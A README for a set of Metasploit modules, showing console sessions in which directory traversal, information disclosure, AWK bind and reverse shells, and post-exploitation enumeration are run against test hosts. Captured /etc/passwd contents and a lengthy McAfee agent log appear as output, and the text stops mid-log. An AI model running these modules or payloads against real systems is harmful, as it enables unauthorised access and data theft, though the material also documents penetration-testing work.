## Modules for metasploit
Some modules that I created for fun. :)

### wildfly_traversal.rb
WildFly 8 (JBossAS) Directory Traversal

Output:
```
msf > use auxiliary/scanner/http/wildfly_traversal
msf auxiliary(wildfly_traversal) > set RHOSTS 192.168.0.23
RHOSTS => 192.168.0.23
msf auxiliary(wildfly_traversal) > run

[*] Attempting to download: standalone\\configuration\\standalone.xml
[*] File saved in:
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wildfly_traversal) > head -10
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
[*] exec: head -10
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml

<?xml version='1.0' encoding='UTF-8'?>

<server xmlns="urn:jboss:domain:2.1">
    <extensions>
        <extension module="org.jboss.as.clustering.infinispan"/>
        <extension module="org.jboss.as.connector"/>
        <extension module="org.jboss.as.deployment-scanner"/>
        <extension module="org.jboss.as.ee"/>
        <extension module="org.jboss.as.ejb3"/>
        <extension module="org.jboss.as.jaxrs"/>
msf auxiliary(wildfly_traversal) >

```

---
### bind_awk.rb
Bind payload via AWK.

Output:
```
msf exploit(handler) > set PAYLOAD cmd/unix/bind_awk
PAYLOAD => cmd/unix/bind_awk
msf exploit(handler) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf exploit(handler) > run

[*] Starting the payload handler...
[*] Started bind handler
[*] Command shell session 2 opened (127.0.0.1:50523 -> 127.0.0.1:4444) at 2014-10-14 14:02:27 -0300

id
uid=1000(blah) gid=1000(blah) groups=1000(blah)
```

---
### enum_devices_apple.rb
Script post-exploitation (linux).

Output:
```
msf post(enum_devices_apple) > run

[+] Info:
[+] 	Ubuntu 13.10
[+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[+] Vendor ID: 0x05ac
[+] Product: iPhone 3GS
[+] Serial: 5b334d2..snip...
[+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
[-] Not mounted
[*] ID Vendor stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_852663.txt
[*] ID Product stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_576096.txt
[*] Serial number stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_144632.txt
[*] Post module execution completed
msf post(enum_devices_apple) >
```
Or:
```
msf post(enum_devices_apple) > run

[+] Info:
[+] 	Ubuntu 13.10  
[+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[+] Vendor ID: 0x05ac
[+] Product: iPhone 3GS
[+] Serial: 5b334d2..snip..
[+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
[+] Files:

AirFair
Airlock
Books
com.apple.itdbprep.postprocess.lock
DCIM
Downloads
iTunes_Control
PhotoData
Photos
Podcasts
Purchases
Recordings
Safari

[*] ID Vendor stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_852663.txt
[*] ID Product stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_576096.txt
[*] Serial number stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_144632.txt
[*] Files stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_480674.txt
[*] Post module execution completed
msf post(enum_devices_apple) >
```

---
### rips_traversal.rb
Exploit RIPS Scanner Directory Traversal

Output:
```
msf > use auxiliary/scanner/http/rips_traversal 
msf auxiliary(rips_traversal) > show options 

Module options (auxiliary/scanner/http/rips_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /rips/           yes       The URI path to the web application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(rips_traversal) > info

       Name: RIPS Scanner Directory Traversal
     Module: auxiliary/scanner/http/rips_traversal
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /rips/           yes       The URI path to the web application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in the RIPS 
  Scanner v0.54 The vulnerability affects to Windows and Linux 
  systems.

References:
  http://codesec.blogspot.com.br/2015/03/rips-scanner-v-054-local-file-include.html

msf auxiliary(rips_traversal) > set RHOSTS 192.168.1.40
RHOSTS => 192.168.1.40
msf auxiliary(rips_traversal) > run

 root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
  bin:x:2:2:bin:/bin:/bin/sh
  sys:x:3:3:sys:/dev:/bin/sh
  ...snip...
  sslh:x:122:132::/nonexistent:/bin/false
  Debian-gdm:x:123:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
  rtkit:x:124:134:RealtimeKit,,,:/proc:/bin/false
  saned:x:125:135::/home/saned:/bin/false
  vboxadd:x:999:1::/var/run/vboxadd:/bin/false
  debian-tor:x:126:136::/var/lib/tor:/bin/false
  privoxy:x:127:65534::/etc/privoxy:/bin/false
 
[+] 192.168.1.40:80 - File saved in: /home/espreto/.msf4/loot/20150327052351_default_192.168.1.40_rips.traversal_037872.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(rips_traversal) >
```

---
### goahead_traversal.rb
Module to read file via directory traversal in GoAhead Web Server.

Output:
```
msf > use auxiliary/scanner/http/goahead_traversal 
msf auxiliary(goahead_traversal) > show options 

Module options (auxiliary/scanner/http/goahead_traversal):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DEPTH     5                yes       Traversal Depth (to reach the root folder)
   FILEPATH  /etc/passwd      yes       The path to the file to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     80               yes       The target port
   THREADS   1                yes       The number of concurrent threads
   VHOST                      no        HTTP server virtual host

msf auxiliary(goahead_traversal) > info

       Name: GoAhead Embedded Web Server Directory Traversal
     Module: auxiliary/scanner/http/goahead_traversal
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Matthew Daley
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  DEPTH     5                yes       Traversal Depth (to reach the root folder)
  FILEPATH  /etc/passwd      yes       The path to the file to read
  Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                     yes       The target address range or CIDR identifier
  RPORT     80               yes       The target port
  THREADS   1                yes       The number of concurrent threads
  VHOST                      no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in the 
  EmbedThis GoAhead Web Server v3.4.1, allowing to read arbitrary 
  files with the web server privileges.

References:
  http://cvedetails.com/cve/2014-9707/
  http://packetstormsecurity.com/files/131156/GoAhead-3.4.1-Heap-Overflow-Traversal.html

msf auxiliary(goahead_traversal) > set RHOSTS 192.168.1.46
RHOSTS => 192.168.1.46
msf auxiliary(goahead_traversal) > run

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
...snip...
saned:x:114:123::/home/saned:/bin/false
espreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
postgres:x:115:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:116:126:MySQL Server,,,:/nonexistent:/bin/false

[+] 192.168.1.46:80 - File saved in: /home/espreto/.msf4/loot/20150407194735_default_192.168.1.46_goahead.traversa_206479.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(goahead_traversal) > set FILEPATH /etc/issue
FILEPATH => /etc/issue
msf auxiliary(goahead_traversal) > run

Ubuntu 12.04.5 LTS \n \l


[+] 192.168.1.46:80 - File saved in: /home/espreto/.msf4/loot/20150407194743_default_192.168.1.46_goahead.traversa_164437.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(goahead_traversal) >
```

---
### enum_system.rb
Find for SUIDs and SGIDs in linux systems.

Output:
```
msf exploit(handler) > run

[*] Started reverse handler on 127.0.0.1:4444
[*] Starting the payload handler...
[*] Command shell session 5 opened (127.0.0.1:4444 -> 127.0.0.1:55287) at 2014-10-14 14:09:09 -0300

^Z
Background session 5? [y/N]  y
msf exploit(handler) > use post/linux/gather/enum_system
msf post(enum_system) > set SESSION 5
SESSION => 5
msf post(enum_system) > run

[+] Info:
[+] 	Ubuntu 12.04.5 LTS  
[+] 	Linux msfdevel 3.11.0-26-generic #45~precise1-Ubuntu SMP Tue Jul 15 04:04:35 UTC 2014 i686 i686 i386 GNU/Linux
[*] Linux version stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_368282.txt
[*] User accounts stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_741490.txt
[*] Installed Packages stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_362788.txt
[*] Running Services stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_321005.txt
[*] Cron jobs stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_182975.txt
[*] Disk info stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_961984.txt
[*] Logfiles stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_763543.txt
[*] Setuid/setgid files stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_505295.txt
[*] Post module execution completed
msf post(enum_system) >
```

---
### reverse_awk.rb
Reverse payload via AWK.

Output:
```
msf exploit(handler) > set PAYLOAD cmd/unix/reverse_awk
PAYLOAD => cmd/unix/reverse_awk
msf exploit(handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(handler) > run

[*] Started reverse handler on 127.0.0.1:4444
[*] Starting the payload handler...
[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:55286) at 2014-10-14 14:06:15 -0300

id
uid=1000(blah) gid=1000(blah) groups=1000(blah)
```

---
### hp_enum_perfd.rb
HP Operations Manager Perfd Environment Scanner

Output:
```
msf auxiliary(hp_enum_perfd) > run

[+] 192.168.1.50:5227, Perfd server banner: Welcome to the perfd server. Hit <RETURN> to continue.
[*] 192.168.1.50:5227 - HP Ops Agent perfd u saved in: /home/espreto/.msf4/loot/20141013114321_blah44_192.168.1.50_hp.ops.agent.per_639769.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd i saved in: /home/espreto/.msf4/loot/20141013154622_blah44_192.168.1.50_hp.ops.agent.per_191505.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd p saved in: /home/espreto/.msf4/loot/20141013154624_blah44_192.168.1.50_hp.ops.agent.per_700482.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd a saved in: /home/espreto/.msf4/loot/20141013154625_blah44_192.168.1.50_hp.ops.agent.per_700091.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd g saved in: /home/espreto/.msf4/loot/20141013154626_blah44_192.168.1.50_hp.ops.agent.per_638440.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd l saved in: /home/espreto/.msf4/loot/20141013154627_blah44_192.168.1.50_hp.ops.agent.per_354406.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd T saved in: /home/espreto/.msf4/loot/20141013154628_blah44_192.168.1.50_hp.ops.agent.per_848307.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd A saved in: /home/espreto/.msf4/loot/20141013154630_blah44_192.168.1.50_hp.ops.agent.per_853753.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(hp_enum_perfd) >
```

---
### couchdb_enum.rb
Enum databases on CouchDB.

Output:
```
msf auxiliary(couchdb_enum) > set RHOST 192.168.1.40
RHOST => 192.168.1.40
msf auxiliary(couchdb_enum) > run

[*] Enumerating...
[+] Found:

[
  "_replicator",
  "_users",
  "database_hackers",
  "database_msf"
]

[+] 192.168.1.40:5984 - File saved in: /home/espreto/.msf4/loot/20150415025544_default_192.168.1.40_couchdb.enum_456115.txt
[*] Auxiliary module execution completed
msf auxiliary(couchdb_enum) > set TARGETURI /database_msf
TARGETURI => /database_msf
msf auxiliary(couchdb_enum) > run

[*] Enumerating...
[+] Found:

{
  "db_name": "database_msf",
  "doc_count": 0,
  "doc_del_count": 0,
  "update_seq": 0,
  "purge_seq": 0,
  "compact_running": false,
  "disk_size": 79,
  "data_size": 0,
  "instance_start_time": "1429077149813920",
  "disk_format_version": 6,
  "committed_update_seq": 0
}

[+] 192.168.1.40:5984 - File saved in: /home/espreto/.msf4/loot/20150415025602_default_192.168.1.40_couchdb.enum_975484.txt
[*] Auxiliary module execution completed
msf auxiliary(couchdb_enum) >

```

---
### couchdb_login.rb
Brute-force login on CouchDB.

Output:
TODO

---
### mcafee_agent_activity_read_log.rb
Information Disclosure.

Output:
```
msf > use auxiliary/scanner/http/mcafee_agent_activity_read_log 
msf auxiliary(mcafee_agent_activity_read_log) > info 

       Name: McAfee Agent Activity Read Log
     Module: auxiliary/scanner/http/mcafee_agent_activity_read_log
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      8081             yes       The target port
  TARGETURI  /                yes       The URI path to the web application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a information disclosure vulnerability in the 
  McAfee Activity Log, allowing to read files with the web server 
  privileges.

References:
  http://codesec.blogspot.com.br

msf auxiliary(mcafee_agent_activity_read_log) > show options 

Module options (auxiliary/scanner/http/mcafee_agent_activity_read_log):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      8081             yes       The target port
   TARGETURI  /                yes       The URI path to the web application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(mcafee_agent_activity_read_log) > set RHOSTS 10.198.44.56
RHOSTS => 10.198.44.56
msf auxiliary(mcafee_agent_activity_read_log) > run

[+] 10.198.44.56:8081 - File saved in: /root/.msf4/loot/20150513141706_default_10.198.44.56_mcafee_log_914120.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mcafee_agent_activity_read_log) > set VERBOSE true
VERBOSE => true
msf auxiliary(mcafee_agent_activity_read_log) > run

<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet type="text/xsl" href="FrameworkLog.xsl"?><naLog><ComputerName>MZ-CW-WS-002</ComputerName><version>4.6.0.3122</version><AgentGUID>{2EDD3B42-F1C1-450F-880F-575933348F5F}</AgentGUID><Log component="2" time="2015-05-13T06:24:07" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T06:24:07" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T06:24:07" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T06:34:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T06:54:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T06:54:07" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T06:54:07" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T06:54:08" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T06:54:09" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T06:54:09" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T06:54:09" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T06:54:09" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T07:14:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="64" time="2015-05-13T07:15:03" type="3">Programador: chamando tarefa [Update_Lista]...</Log><Log component="64" time="2015-05-13T07:15:03" type="3">Novo horário (local) da tarefa Update_Lista: quarta-feira, 13 de maio de 2015 09:15:00</Log><Log component="4" time="2015-05-13T07:15:04" type="3">Verificando pacotes de atualização do repositório ePO_CMZGAVS06.</Log><Log component="4" time="2015-05-13T07:15:04" type="3">Inicializando atualização...</Log><Log component="4" time="2015-05-13T07:15:04" type="3">Verificando catalog.z.</Log><Log component="4" time="2015-05-13T07:15:04" type="3">Extraindo catalog.z.</Log><Log component="4" time="2015-05-13T07:15:04" type="3">Carregando configuração de atualização em: catalog.xml</Log><Log component="4" time="2015-05-13T07:15:05" type="3">Essas atualizações serão aplicadas se estiverem no repositório:  DAT, EXTRADAT1000.</Log><Log component="4" time="2015-05-13T07:15:05" type="3">Fazendo download de PkgCatalog.z.</Log><Log component="4" time="2015-05-13T07:15:05" type="3">Verificando PkgCatalog.z.</Log><Log component="4" time="2015-05-13T07:15:05" type="3">Extraindo PkgCatalog.z.</Log><Log component="4" time="2015-05-13T07:15:05" type="3">Carregando configuração de atualização em: PkgCatalog.xml</Log><Log component="4" time="2015-05-13T07:15:06" type="3">Verificando V2datdet.mcs.</Log><Log component="4" time="2015-05-13T07:15:07" type="3">Produtos executando DATs mais recente.</Log><Log component="4" time="2015-05-13T07:15:07" type="3">Atualizações não foram aplicadas porque scripts de detecção não foram encontrados na filial Current:  EXTRADAT1000.</Log><Log component="4" time="2015-05-13T07:15:07" type="3">Atualização concluída</Log><Log component="64" time="2015-05-13T07:15:18" type="3">Programador: tarefa [Update_Lista] concluída</Log><Log component="8192" time="2015-05-13T07:24:09" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T07:24:09" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T07:24:10" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T07:24:10" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T07:24:10" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T07:24:10" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T07:24:10" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T07:34:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T07:54:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T07:54:10" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T07:54:10" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T07:54:11" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T07:54:12" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T07:54:12" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T07:54:12" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T07:54:12" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T08:14:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T08:24:12" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T08:24:12" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T08:24:13" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T08:24:13" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T08:24:13" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T08:24:13" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T08:24:13" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T08:34:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T08:54:04" type="3">O agente começou a executar ASCI</Log><Log component="8192" time="2015-05-13T08:54:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="2" time="2015-05-13T08:54:04" type="3">Coletando propriedades</Log><Log component="8192" time="2015-05-13T08:54:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Sessão de comunicação do agente iniciada</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Agente enviando pacote PROPS VERSION para o servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Agente conectando-se ao servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Pacote carregado no servidor ePO com êxito</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Sessão de comunicação do agente encerrada</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">O agente recebeu pacote REQUEST PROPS do servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Sessão de comunicação do agente iniciada</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Agente enviando pacote INC PROPS para o servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Agente conectando-se ao servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Pacote carregado no servidor ePO com êxito</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">Sessão de comunicação do agente encerrada</Log><Log component="8192" time="2015-05-13T08:54:05" type="3">O agente recebeu pacote POLICY do servidor ePO</Log><Log component="8192" time="2015-05-13T08:54:06" type="3">A nova política do servidor foi combinada com êxito</Log><Log component="8192" time="2015-05-13T08:54:06" type="3">Cumprindo políticas obtidas recentemente por download</Log><Log component="8192" time="2015-05-13T08:54:06" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T08:54:06" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T08:54:07" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T08:54:07" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T08:54:07" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T08:54:07" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T08:54:07" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T09:14:04" type="3">O agente está procurando eventos a serem carregados</Log><Log component="64" time="2015-05-13T09:15:07" type="3">Programador: chamando tarefa [Update_Lista]...</Log><Log component="64" time="2015-05-13T09:15:07" type="3">Novo horário (local) da tarefa Update_Lista: quinta-feira, 14 de maio de 2015 01:15:00</Log><Log component="4" time="2015-05-13T09:15:08" type="3">Verificando pacotes de atualização do repositório ePO_CMZGAVS06.</Log><Log component="4" time="2015-05-13T09:15:08" type="3">Inicializando atualização...</Log><Log component="4" time="2015-05-13T09:15:08" type="3">Verificando catalog.z.</Log><Log component="4" time="2015-05-13T09:15:08" type="3">Extraindo catalog.z.</Log><Log component="4" time="2015-05-13T09:15:08" type="3">Carregando configuração de atualização em: catalog.xml</Log><Log component="4" time="2015-05-13T09:15:09" type="3">Essas atualizações serão aplicadas se estiverem no repositório:  DAT, EXTRADAT1000.</Log><Log component="4" time="2015-05-13T09:15:09" type="3">Fazendo download de PkgCatalog.z.</Log><Log component="4" time="2015-05-13T09:15:10" type="3">Verificando PkgCatalog.z.</Log><Log component="4" time="2015-05-13T09:15:10" type="3">Extraindo PkgCatalog.z.</Log><Log component="4" time="2015-05-13T09:15:10" type="3">Carregando configuração de atualização em: PkgCatalog.xml</Log><Log component="4" time="2015-05-13T09:15:11" type="3">Verificando V2datdet.mcs.</Log><Log component="4" time="2015-05-13T09:15:11" type="3">Produtos executando DATs mais recente.</Log><Log component="4" time="2015-05-13T09:15:11" type="3">Atualizações não foram aplicadas porque scripts de detecção não foram encontrados na filial Current:  EXTRADAT1000.</Log><Log component="4" time="2015-05-13T09:15:11" type="3">Atualização concluída</Log><Log component="64" time="2015-05-13T09:15:22" type="3">Programador: tarefa [Update_Lista] concluída</Log><Log component="8192" time="2015-05-13T09:24:07" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T09:24:07" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T09:24:08" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T09:24:08" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T09:24:08" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T09:24:08" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T09:24:08" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T09:34:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T09:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T09:54:08" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T09:54:08" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T09:54:09" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T09:54:10" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T09:54:10" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T09:54:10" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T09:54:10" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T10:14:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T10:24:10" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T10:24:10" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T10:24:11" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T10:24:11" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T10:24:11" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T10:24:11" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T10:24:11" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T10:34:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T10:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T10:54:11" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T10:54:11" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T10:54:12" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T10:54:13" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T10:54:13" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T10:54:13" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T10:54:13" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T11:14:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T11:24:13" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T11:24:13" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T11:24:14" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T11:24:14" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T11:24:14" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T11:24:14" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T11:24:14" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T11:34:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">O agente começou a executar ASCI</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="2" time="2015-05-13T11:54:05" 